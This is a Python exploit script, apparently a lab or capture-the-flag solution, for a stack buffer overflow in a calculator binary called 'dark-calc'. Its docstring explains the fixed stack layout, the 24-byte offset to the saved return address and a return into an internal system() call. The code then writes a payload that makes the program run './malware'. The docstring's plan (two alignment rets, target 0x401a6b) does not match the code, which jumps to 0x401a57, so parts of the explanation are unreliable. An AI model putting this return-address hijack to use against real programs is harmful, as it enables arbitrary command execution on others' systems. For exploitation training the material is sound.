#!/usr/bin/env python3
"""Task 1: execute attack/malware via the dark-calc calculator.

Plan
----
dark-calc links with --wrap=main: `__wrap_main` switches rsp to the RWX
mapping at 0x721000000000 (top 0x7210801000), so every stack address is
fixed.  In `input()` the 16-byte buffer `expression` sits at rbp-0x10,
the saved rbp directly above it, and the return address 8 bytes above
that: 24 bytes of padding reach the return slot.

The payload returns to the `system(command_buf)` call inside `eval()`
(0x401a6b sets rdi to command_buf and calls system), skipping the
string-assembly code.  Two plain `ret`s (0x4019d6) are used first to
realign the stack to a 16-byte boundary, because jumping straight into
the middle of `eval()` would otherwise crash inside glibc's `system()`
on an unaligned movaps.

`input()` first copies our line into the global `command_buf`
(strcpy), so the leading "./malware" becomes the exact argument of
system().  The malware script checks that its ancestor process is
dark-calc and prints the success banner.
"""
import struct
import sys

# 0x401a57: mov esi,0x6030d0 ; mov edi,0x401d10 ; mov eax,0 ; call printf
#           ; mov edi,0x6030d0 ; call system   (rsp stays 16-byte aligned)
cmd = b"./malware\x00"
payload = cmd + b"A" * (24 - len(cmd))  # expression -> command_buf, pad to 24
payload += struct.pack("<Q", 0x401A57)
payload += b"\n"

sys.stdout.buffer.write(payload)
